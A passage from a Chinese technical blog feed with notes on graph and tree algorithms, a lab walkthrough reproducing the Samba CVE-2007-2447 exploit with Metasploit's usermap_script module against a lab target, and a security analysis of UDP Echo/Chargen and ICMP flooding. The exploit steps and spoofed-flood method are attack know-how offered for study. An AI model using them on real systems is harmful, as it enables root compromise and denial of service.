BFS算法常用于解决图的最短路径、连通性、拓扑排序等问题。在实际应用中，BFS算法也可以用于解决一些经典问题，例如迷宫问题等。</p><h2 id="四、最小生成树"><a href="#四、最小生成树" class="headerlink" title="四、最小生成树"></a>四、最小生成树</h2><p>把构造连通图的最小代价生成树称为最小生成树</p><h3 id="4-1-Prim算法"><a href="#4-1-Prim算法" class="headerlink" title="4.1 Prim算法"></a>4.1 Prim算法</h3><p>它是一种用于求解加权无向连通图的最小生成树的贪心算法。</p><p>它的基本思想是从一个任意顶点开始，每次找到与当前生成树相邻的、边权最小的顶点加入生成树中，直到所有顶点都被加入生成树为止。Prim算法使用一个优先队列来维护当前与生成树相邻的顶点，每次从优先队列中取出边权最小的顶点加入生成树，然后将该顶点的所有未被访问过的邻接点加入优先队列中。这个过程持续到所有顶点都被加入生成树为止。</p><p>Prim算法的具体实现可以采用两种不同的数据结构，分别是邻接矩阵和邻接表。邻接矩阵可以用来表示稠密图，它的时间复杂度为O(V^2)，其中V为顶点数。邻接表可以用来表示稀疏图，它的时间复杂度为O(E log V)，其中E为边数，V为顶点数。因此，在实际应用中，我们通常使用邻接表来实现Prim算法。</p><p>Prim算法的时间复杂度为O(E log V)，其中E为边数，V为顶点数。这是因为Prim算法需要遍历每个顶点，并且需要在每次遍历时更新优先队列中的元素。由于使用了优先队列来维护当前与生成树相邻的顶点，因此可以保证每次取出的顶点都是当前与生成树距离最小的顶点，从而保证了Prim算法的正确性。</p><h3 id="4-2-Kruskal算法"><a href="#4-2-Kruskal算法" class="headerlink" title="4.2 Kruskal算法"></a>4.2 Kruskal算法</h3><p>Kruskal算法是一种用于求解加权无向连通图的最小生成树的贪心算法。他的基本思想是将图中的所有边按照边权从小到大进行排序，然后依次将边加入生成树中，如果加入某条边会形成环，则舍弃该边，直到所有顶点都被加入生成树为止。</p><p>Kruskal算法的时间复杂度为O(ElogE)，其中E为边数，V为顶点数。这是因为Kruskal算法需要排序所有边，并且需要在每次遍历时判断当前边的两个端点是否在同一集合中。由于使用了并查集来维护当前生成树的连通性，因此可以保证每次加入的边都不会形成环，从而保证了Kruskal算法的正确性。</p><p>Kruskal算法的优点是实现简单，适用于稀疏图。当图的边数比较大时，Kruskal算法的效率比Prim算法高。Kruskal算法的缺点是空间复杂度比较高，因为需要使用并查集来维护当前生成树的连通性，当图的顶点数较大时，会占用较多的内存空间。</p><p><strong>ps：</strong>并查集是一种用于处理集合合并及查询连通性问题的数据结构，常用于求解最小生成树、最短路、图的连通性等问题。并查集主要支持两个操作：合并和查找。</p><ul><li>合并操作：将两个不相交的集合合并为一个集合。</li><li>查找操作：查找某个元素所在的集合。 并查集通常使用一个数组来表示集合，数组中的每个元素表示一个节点，节点的值表示该节点的父节点。如果一个节点的父节点为自身，则说明该节点是集合的代表元素。并查集的合并操作可以通过将两个节点的父节点设置为同一个值来实现，查找操作可以通过递归地查找该节点的父节点并返回其代表元素来实现。在实际应用中，为了提高并查集的效率，通常会使用路径压缩和按秩合并等优化技术。 并查集的时间复杂度主要取决于合并操作的时间复杂度，因此可以通过使用路径压缩和按秩合并等优化技术来减少合并操作的时间复杂度，并使得并查集的时间复杂度达到近乎常数级别。</li></ul><h2 id="五、最短路径"><a href="#五、最短路径" class="headerlink" title="五、最短路径"></a>五、最短路径</h2><p>对于网图来说，最短路径就是两个顶点之间经过的边上权值之和最小的路径，并且我们称路径上的第一个顶点是源点，最后一个顶点是终点。</p><h3 id="5-1-Dijkstra算法"><a href="#5-1-Dijkstra算法" class="headerlink" title="5.1 Dijkstra算法"></a>5.1 Dijkstra算法</h3><p>Dijkstra算法是一种用于求解带权有向图中单源最短路径的算法，其基本思想是从源点开始，按照节点到源点的距离递增的顺序依次确定每个节点的最短路径。Dijkstra算法可以处理没有负权边的图，时间复杂度为O(n^2)，其中n为节点数。 具体来说，Dijkstra算法的步骤如下：</p><ol><li>初始化：将源点的最短路径长度设为0，将其它节点的最短路径长度设为无穷大，将所有节点标记为未访问。</li><li>选择最短路径节点：从未访问的节点中选择一条距离源点最近的节点，将其标记为已访问。</li><li>更新最短路径：对于从源点出发，且未访问的每个相邻节点，如果经过当前节点到达该相邻节点的距离比该相邻节点当前的最短路径更短，则更新该相邻节点的最短路径。</li><li>重复第2步和第3步，直到所有节点都被访问。</li><li>最短路径计算：根据每个节点的最短路径长度，可以计算出源点到每个节点的最短路径。 Dijkstra算法的时间复杂度取决于选择最短路径节点的方式。如果使用线性搜索来选择最短路径节点，则时间复杂度为O(n^2)；如果使用堆或优先队列来选择最短路径节点，则时间复杂度为O(m log n)，其中m为边数。因此，使用堆或优先队列的Dijkstra算法更适合处理大型稠密图，而使用线性搜索的Dijkstra算法更适合处理小型稀疏图。</li></ol><h3 id="5-2-Floyd算法"><a href="#5-2-Floyd算法" class="headerlink" title="5.2 Floyd算法"></a>5.2 Floyd算法</h3><p>Floyd算法是一种用于求解全源最短路径的算法，它的基本思想是动态规划。具体而言，Floyd算法通过中间节点逐步扩展路径，更新每对节点之间的最短路径长度，直到得到所有节点之间的最短路径长度。</p><p>Floyd算法的步骤如下：</p><ol><li><p>初始化：将每对节点之间的最短路径长度初始化为直接相连的边的权值，对于不相邻的节点之间的距离，将其距离设为无穷大（表示不可达）。</p></li><li><p>中间节点遍历：对于每一个节点k，检查从节点i到节点j的路径是否通过节点k，如果通过节点k路径更短，则更新节点i到节点j的最短路径长度。</p></li><li><p>重复执行2，直到每对节点之间的最短路径长度不再更新。 Floyd算法的时间复杂度为O(n^3)，其中n为节点数。</p><p>下面是Floyd算法的伪代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">procedure <span class="hljs-title">FloydWarshall</span> <span class="hljs-params">(distance[][], V)</span></span><br><span class="hljs-function">   <span class="hljs-keyword">for</span> k from 1 to V</span><br><span class="hljs-function">      <span class="hljs-keyword">for</span> i from 1 to V</span><br><span class="hljs-function">         <span class="hljs-keyword">for</span> j from 1 to V</span><br><span class="hljs-function">            distance[i][j] </span>= <span class="hljs-built_in">min</span>(distance[i][j], distance[i][k] + distance[k][j])<br></code></pre></td></tr></table></figure></li></ol><h2 id="六、拓扑排序"><a href="#六、拓扑排序" class="headerlink" title="六、拓扑排序"></a>六、拓扑排序</h2><p>在一个表示工程的有向图中，用顶点表示活动，用弧表示活动之间的优先关系，这样的有向图为顶点表示活动的网，我们称为<strong>AOV网</strong></p><p>设G=(V,E)是一个具有n个顶点的有向图，V中的顶点序列v~1~，v~2~，……，v~n~，满足若从顶点v~i~到v~j~有一条路径，则在顶点序列中顶点v~i~必在v~j~之前，则我们称这样的顶点序列为一个拓扑序列。</p><p>拓扑序列可以使用拓扑排序算法，其基本思想是通过不断删除入度为0的节点，来逐步构建DAG的拓扑序列。</p><p>拓扑排序算法步骤：</p><ol><li>统计每个节点的入度。对于每个节点，统计其有多少个父节点（即指向该节点的边的数量），并将这个值存储在一个数组中。</li><li>将入度为0的节点加入队列。将所有入度为0的节点加入一个队列中，作为拓扑序列的起点。</li><li>删除入度为0的节点。从队列中取出一个入度为0的节点，将其从图中删除，并将其所有邻居节点的入度减1。如果邻居节点的入度变为0，则将其加入队列中。</li><li>重复步骤3，直到队列为空。重复执行步骤3，直到队列为空。如果在此过程中，存在某个节点的入度始终不为0，那么这个图就不是DAG，拓扑排序失败。</li><li>输出拓扑序列。当队列为空时，所有节点都已经被访问，拓扑序列构建完成，按照拓扑序列输出所有节点即可。</li></ol><p>拓扑排序算法的时间复杂度为O(V+E)，其中V是节点数，E是边数。</p><h2 id="七、关键路径"><a href="#七、关键路径" class="headerlink" title="七、关键路径"></a>七、关键路径</h2><p>在一个表示工程的带权有向图中，用顶点表示事件，用有向边表示活动，用边上的权值表示活动的持续时间，这种有向图的边表示活动的网，称之为AOE网。</p><p><strong>关键路径</strong>是指在一个项目网络图中，从开始节点到结束节点的所有路径中，耗时最长的路径。<strong>在这个路径上的每个活动都是关键活动</strong>。因为这些活动的持续时间不能延误，否则整个项目的完成时间都会被延误。</p><p><strong>1. ETV：事件最早发生时间，就是顶点的最早发生时间</strong></p><p><strong>2. LTV：事件最晚需要开始的时间，超出此时间将会延误整个工程</strong></p><p><strong>3. ETE：活动最早开工时间，即弧a~k~的最早发生时间</strong></p><p><strong>4. LTE：活动的最晚开工时间，即弧a~k~的最晚发生时间</strong></p><p><strong>ETE和LTE相等的活动就是关键活动</strong></p><p><strong>关键路径上的顶点时间最早发生时间和最晚发生时间一致</strong></p><p>第一步：拓扑排序获得每一个事件的最早发生时间</p><p>第二步：根据事件的最早发生时间EVT推断事件的最晚发生时间LTV</p><p>第三步：找到EVT和LTV相等的事件</p><p><strong>计算活动的最早与最晚发生时间</strong></p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230320202500069.png" alt="示例"></p><p>以上图为例，当我们已经知道了事件的最早发生时间和最晚发生时间之后，我们可以推断出活动的最早发生时间和最晚发生时间</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">事件V1 V2 V3 V4 V5 V6 V7 V8 V9<br>最早发生  <span class="hljs-number"> 0 </span> 6<span class="hljs-number"> 4 </span><span class="hljs-number"> 5 </span><span class="hljs-number"> 7 </span><span class="hljs-number"> 7 </span><span class="hljs-number"> 16 </span>14 18<br>最迟发生  <span class="hljs-number"> 0 </span><span class="hljs-number"> 6 </span><span class="hljs-number"> 6 </span><span class="hljs-number"> 8 </span><span class="hljs-number"> 7 </span><span class="hljs-number"> 10 </span>16<span class="hljs-number"> 14 </span>18<br>活动      a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11<br>最早开始  <span class="hljs-number"> 0 </span><span class="hljs-number"> 0 </span><span class="hljs-number"> 0 </span><span class="hljs-number"> 6 </span><span class="hljs-number"> 4 </span><span class="hljs-number"> 5 </span><span class="hljs-number"> 7 </span><span class="hljs-number"> 7 </span><span class="hljs-number"> 7 </span><span class="hljs-number"> 16 </span> 14<br>最晚开始  <span class="hljs-number"> 0 </span><span class="hljs-number"> 2 </span><span class="hljs-number"> 3 </span><span class="hljs-number"> 6 </span><span class="hljs-number"> 6 </span><span class="hljs-number"> 8 </span><span class="hljs-number"> 7 </span><span class="hljs-number"> 7 </span><span class="hljs-number"> 10 </span>16  14<br></code></pre></td></tr></table></figure><p>以a4为例，它的最早发生时间为，事件2的最早发生时间为6，立马进行活动a4，所以a4的最早发生时间为6，事件2的最晚发生时间为6，事件5的最晚发生时间是7，而a4所需要的时间为1，所以a4的最晚发生时间为7-1=6，这样才不会延误整个工程，其余活动同理。</p><p>最终就可以找到关键路径与关键活动</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>数据结构--树（2）</title>
    <link href="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/"/>
    <url>/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="数据结构—树（2）"><a href="#数据结构—树（2）" class="headerlink" title="数据结构—树（2）"></a>数据结构—树（2）</h1><h2 id="一、线索二叉树原理"><a href="#一、线索二叉树原理" class="headerlink" title="一、线索二叉树原理"></a>一、线索二叉树原理</h2><p>如下图，很多的空指针域的存在使得空间大大的浪费，应该想办法利用起来。</p><p><img src="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/image-20230313204047402.png" alt="常规二叉树"></p><p>将空指针利用起来，存放指向结点在某次遍历次序下的前驱和后继结点的地址，<strong>指向前驱和后继的指针称为线索，加上线索的二叉链表称为线索链表，相应的二叉树就称为线索二叉树。</strong></p><p>上面的图中序遍历结果：<strong>HDIBEJAFCG</strong></p><p>我们将所有的空指针域中的<strong>rchild</strong>改为指向它的后继结点，就可以得到下图</p><p><img src="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/image-20230313204625499.png" alt="后继"></p><p>我们同样将这棵二叉树的所有空指针域中的lchild改为指向当前结点的前驱。因此H的前驱是NULL，I的前驱是D……</p><p><img src="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/image-20230313204943286.png" alt="前驱"></p><p>我们对二叉树以某种次序遍历使得其变为线索二叉树的过程称为线索化</p><p><img src="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/image-20230313205049782.png" alt="线索化"></p><p>上图中，空心箭头实线为前驱，虚线黑箭头为后继</p><p>但是我们该如何判断结点的lchild是指向它的左孩子还是指向前驱？rchild是指向它的右孩子还是指向后继？</p><p>所以添加两个标志域<strong>ltag</strong>和<strong>rtag</strong>，存放0或1的布尔型变量。</p><p><img src="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/image-20230313205349911.png" alt="结点结构"></p><p>ltag为0时指向该节点的左孩子，为1时指向该节点的前驱</p><p>rtag为0时指向该节点的右孩子，为1时指向该节点的后继</p><p><img src="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/image-20230313205511682.png" alt="image-20230313205511682"></p><p>在实际问题中，如果所用的二叉树需经常遍历或查找结点时需要某种遍历序列中的前驱和后继，那么采用线索二叉链表的存储结构就是非常不错的选择。</p><h2 id="二、树、森林与二叉树的转换"><a href="#二、树、森林与二叉树的转换" class="headerlink" title="二、树、森林与二叉树的转换"></a>二、树、森林与二叉树的转换</h2><h3 id="3-1-树转换为二叉树"><a href="#3-1-树转换为二叉树" class="headerlink" title="3.1 树转换为二叉树"></a>3.1 树转换为二叉树</h3><p>（1）加线。在所有兄弟结点之间加一条连线。</p><p>（2）去线。对树中每个结点，只保留它与第一个孩子结点的连线，删除它与其他孩子结点之间的连线。</p><p>（3）层次调整。以树的根节点为轴心，将整棵树顺时针旋转一定的角度，使之结构层次分明。注意第一个孩子是二叉树结点的左孩子，兄弟转换过来的孩子是结点的右孩子。</p><p><img src="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/image-20230313210228805.png" alt="树--&gt;二叉树"></p><h3 id="3-2-森林转换为二叉树"><a href="#3-2-森林转换为二叉树" class="headerlink" title="3.2 森林转换为二叉树"></a>3.2 森林转换为二叉树</h3><p>森林是由若干棵树组成的</p><p>（1）把每个树转换为二叉树</p><p>（2）第一棵二叉树不动，从第二棵二叉树开始，依次把后一棵二叉树的根节点作为前一棵二叉树的根节点的右孩子，用线连起来。当所有的二叉树连接起来之后就得到了由森林转换来的二叉树。</p><p><img src="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/image-20230313210737956.png" alt="森林--&gt;二叉树"></p><h3 id="3-3-二叉树转换为树"><a href="#3-3-二叉树转换为树" class="headerlink" title="3.3 二叉树转换为树"></a>3.3 二叉树转换为树</h3><p>二叉树转换为树就是树转换为二叉树的逆过程</p><p>（1）加线。某节点的左孩子节点存在，则将这个左孩子的右孩子节点、右孩子的右孩子节点、右孩子的右孩子节点的右孩子……就是左孩子的n个右孩子节点都作为此结点的孩子。将该结点与这些右孩子结点用线连接起来。</p><p>（2）去线。删除原二叉树中所有结点与其右孩子结点的连线</p><p>（3）层次调整。使之结构层次分明。</p><p><img src="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/image-20230313211329748.png" alt="二叉树--&gt;树"></p><h3 id="3-4-二叉树转换成森林"><a href="#3-4-二叉树转换成森林" class="headerlink" title="3.4 二叉树转换成森林"></a>3.4 二叉树转换成森林</h3><p>判断一棵二叉树能否转换成一棵树还是森林，标准很简单，那就是只要看这棵二叉树的根结点有没有右孩子，有就是森林，没有就是一棵树，那么如果是转换成森林，步骤如下：</p><p>（1）从根结点开始，若右孩子存在，则把与右孩子节点的连线删除，再查看分离后的二叉树，若右孩子存在，则连线删除……，直到所有右孩子连线都删除为止，得到分离的二叉树。</p><p>（2）再将每棵分离后的二叉树转换为树即可。</p><p><img src="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/image-20230313211723920.png" alt="二叉树--&gt;森林"></p><h3 id="3-5-树与森林的遍历"><a href="#3-5-树与森林的遍历" class="headerlink" title="3.5 树与森林的遍历"></a>3.5 树与森林的遍历</h3><p>树的遍历有两种：（1）先根遍历树，即先访问树的根结点，然后依次分根遍历树的每棵子树。（2）后根遍历，即先依次后根遍历每棵子树，然后再访问根结点。</p><p>森林的遍历也分为两种方式：（1）前序遍历：先访问森林中第一棵树的根结点，然后再依次先根遍历根的每棵子树，再依次用同样的方式遍历除去第一棵树的剩余树构成的森林。（2）后序遍历：先访问森林中的第一棵树，后根遍历的方式遍历每棵子树，然后再访问根结点，</p><h2 id="三、哈夫曼树及其应用"><a href="#三、哈夫曼树及其应用" class="headerlink" title="三、哈夫曼树及其应用"></a>三、哈夫曼树及其应用</h2><p>从树中一个结点到另一个结点之间的分支构成两个结点之间的路径，路径上的分支数目称为路径长度。树的路径长度就是从树根到每一个节点的路径长度之和。</p><p>考虑到带权的结点， 结点的带权的路径长度为从该结点到树根之间的路径长度与结点上权的乘积。树的带权路径长度为树中所有叶子结点的带权路径长度之和。假设有n个权值{w~1~,w~2~,…w~n~}，构造一棵有n个叶子结点的二叉树，每个叶子结点带权w~k~，每个叶子的路径长度为lk，我们通常记作，则其中带权路径长度WPL最小的二叉树称作哈夫曼树。</p><p><img src="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/image-20230313215207145.png" alt="二叉树a"></p><p>二叉树a的WPL=5×1+15×2+40×3+30×4+10×4=315</p><p>构造哈夫曼树的哈夫曼算法描述：</p><p><img src="/2023/03/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91%EF%BC%882%EF%BC%89/image-20230313215417608.png" alt="哈夫曼树"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>利用Metasploit Framework进行CVE-2007-2447漏洞复现</title>
    <link href="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="利用Metasploit-Framework进行CVE-2007-2447漏洞复现"><a href="#利用Metasploit-Framework进行CVE-2007-2447漏洞复现" class="headerlink" title="利用Metasploit Framework进行CVE-2007-2447漏洞复现"></a>利用Metasploit Framework进行CVE-2007-2447漏洞复现</h1><h2 id="一、复现过程"><a href="#一、复现过程" class="headerlink" title="一、复现过程"></a>一、复现过程</h2><p><strong>（1）攻击者IP地址</strong></p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194412490.png" alt="攻击者IP"></p><p><strong>（2）攻击者扫描其他计算机，在这些计算机中找到靶机</strong></p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194423351.png" alt="寻找受害者机器"></p><p>这里打开自己的靶机，进行一个验证，是否真的嗅探到了我们的靶机</p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194530020.png" alt="靶机IP"></p><p><strong>（4）识别靶机上运行的操作系统及其版本</strong></p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194554707.png" alt="OS and kernerl version"></p><p><strong>（5）识别目标机器上运行的服务及版本</strong></p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194632070.png" alt="service version"></p><p><strong>（6）明确漏洞信息：CVE-2007-2447</strong></p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194657088.png" alt="漏洞信息1"></p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194709604.png" alt="漏洞信息2"></p><p><strong>（7）利用目标机器上操作系统和软件漏洞展开攻击</strong></p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194729751.png" alt="image-20230313194729751"></p><p><strong>（8）开启Metasploit Framework工具</strong></p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194754693.png" alt="Metasploit Framework"></p><p><strong>本次攻击中我选择利用第八个： exploit/multi/samba/usermap_script</strong></p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194818310.png" alt="可用的攻击"></p><p><strong>（9）进行攻击配置，发动攻击</strong></p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194842195.png" alt="配置RHOSTS"></p><p><strong>RHOST</strong>是靶机的IP，所以修改为之前嗅探的IP地址：<strong>192.168.57.139</strong></p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194916626.png" alt="修改后"></p><p><strong>（10）配置完毕，发动攻击</strong></p><p><img src="/2023/03/13/%E5%88%A9%E7%94%A8Metasploit%20Framework%E8%BF%9B%E8%A1%8CCVE-2007-2447%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230313194942425.png" alt="发动攻击"></p><h2 id="二、漏洞危害"><a href="#二、漏洞危害" class="headerlink" title="二、漏洞危害"></a>二、漏洞危害</h2><p>由于该漏洞被利用之后，可以达到打开了一个root权限的shell，而shell管理着用户与操作系统的交互，90%以上的命令都可以通过shell来实现，无论是删除文件还是修改文件，恶意的运行代码，对计算机将会产生最大的危害。但是实际上这个漏洞利用之后可以执行任意命令，不单单是创建一个反向shell，只不过是shell看上去更加直观而且更加方便后续的攻击。</p><h2 id="三、产生原因"><a href="#三、产生原因" class="headerlink" title="三、产生原因"></a>三、产生原因</h2><p><strong>Samba</strong>是<strong>Samba</strong>团队开发的一套可使UNIX系列的操作系统与微软Windows操作系统的SMB/CIFS网络协议做连结的自由软件。该软件支持共享打印机、互相传输资料文件等，感觉可以理解为在<strong>linux</strong>是插在<strong>windows</strong>上的一个U盘。</p><p><strong>Samba</strong>在处理用户数据时存在输入验证漏洞，远程攻击者可能利用此漏洞在服务器上执行任意命令，具体的来说是：<strong>Samba</strong>中负责在<strong>SAM</strong>数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。</p><p>假想这样一个情境：如果在调用<strong>smb.conf</strong>中定义的外部脚本时，此时必然需要打开一个<strong>shell</strong>，此时如果有输入的需求，而我们通过对/bin/sh的<strong>MS-RPC</strong>调用提交了恶意输入的话，就可能允许攻击者以<strong>nobody</strong>用户的权限执行任意命令，这里的任意命令就可以像是上面这样的攻击一样，创建一个反向<strong>shell</strong>。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TCP/IP协议栈安全分析--UDP、ICMP</title>
    <link href="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--UDP/"/>
    <url>/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--UDP/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP-IP协议栈安全分析—UDP、ICMP"><a href="#TCP-IP协议栈安全分析—UDP、ICMP" class="headerlink" title="TCP/IP协议栈安全分析—UDP、ICMP"></a>TCP/IP协议栈安全分析—UDP、ICMP</h1><h2 id="一、UDP简介"><a href="#一、UDP简介" class="headerlink" title="一、UDP简介"></a>一、UDP简介</h2><p>UDP是一个简单的面向消息的传输层协议，使用最小协议机制的简单无连接通信模型。UDP提供数据完整性的校验和，以及用于在数据报的源和目标寻址不同函数的端口号。它没有握手对话，因此将用户的程序暴露在底层网络的任何不可靠的方面。</p><p>简而言之：UDP是基于IP的简单协议，不可靠协议，但是轻量化。UDP数据传输过程中，<strong>没有纠错和重传机制，也没有检测丢包、复制或重新排序</strong>的机制，甚至误码检测也是可选项。在数据的接受端，被分片的UDP数据包能够得以重组。UDP用于交换消息的开销要比TCP小很多，使得它非常适用于<strong>挑战/响应型</strong>的应用，如NFS</p><h2 id="二、安全分析"><a href="#二、安全分析" class="headerlink" title="二、安全分析"></a>二、安全分析</h2><p>当UDP用于大量的数据传输的时候，协议自身缺少流控制特征，所以它能堵塞主机或路由器，并丢失大量的数据包。</p><p><strong>UDP FLOOD—利用网络协议漏洞</strong></p><p>①Echo服务（TCP 7和UDP 7）对每个接收到的字符进行回送(相同的字符)</p><p>②Chargen服务(TCP 19和UDP 19)对接收到的每个数据包都返回一些随机生成的字符，即如果与Chargen服务建立了连接，它会不断返回乱字符直到连接中断</p><p>原理：</p><ol><li>黑客C选择两个目标A和B</li><li>生成伪造的UDP包，目的地是B的Chargen端口，来源”假冒“为A的Echo端口</li><li>B的Chargen服务返回的随机字符发送给真实A的Echo服务</li><li>A再向B回送接收到的字符，如此反复，最终导致这两台主机应接不暇而拒绝服务</li><li>A和B的内存和两者所在局域网的带宽都受到严重损耗</li></ol><p>对策：</p><ol><li>Echo和Chargen”置之不理“1024以下的源端口</li><li>尽量减少开放不必要的网络服务</li></ol><h2 id="三、ICMP简介"><a href="#三、ICMP简介" class="headerlink" title="三、ICMP简介"></a>三、ICMP简介</h2><p>ICMP是 Internet Control Message Protocol 的缩写，即互联网控制消息协议。它是互联网协议族的核心协议之一。它用于 TCP/IP 网络中发送控制消息，提供可能发生在通信环境中的各种问题反馈，通过这些信息，使网络管理者可以对所发生的问题作出诊断，然后采取适当的措施解决问题。</p><p><strong>ICMP</strong>是网络层协议，但是它不像IP协议和ARP协议一样直接传递给数据链路层，而是<strong>先封装成IP数据包然后再传递给数据链路层</strong>。所以IP数据包中如果协议字段的值是1的话，就代表IP数据是ICMP报文</p><p><strong>ICMP</strong>协议的类型分成两大类，<strong>查询报文</strong>和<strong>差错报文</strong></p><h2 id="四、报文格式"><a href="#四、报文格式" class="headerlink" title="四、报文格式"></a>四、报文格式</h2><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--UDP/image-20230312144157829.png" alt="过程"></p><p><strong>ICMP包格式：</strong></p><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--UDP/image-20230312144243572.png" alt="ICMP包格式"></p><h2 id="五、ICMP安全"><a href="#五、ICMP安全" class="headerlink" title="五、ICMP安全"></a>五、ICMP安全</h2><p>ICMP对于网络安全具有极为重要的意义。ICMP本身非常简单，它并不具有验证机制，这也导致它非常容易被用于攻击交换机、路由器等网络设备。</p><p><strong>ICMP洪泛攻击：</strong>攻击者在短时间内向目标设备发送大量的ICMP虚假报文，导致目标设备忙于应付无用报文，而无法为用户提供正常服务。</p><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--UDP/image-20230312145215943.png" 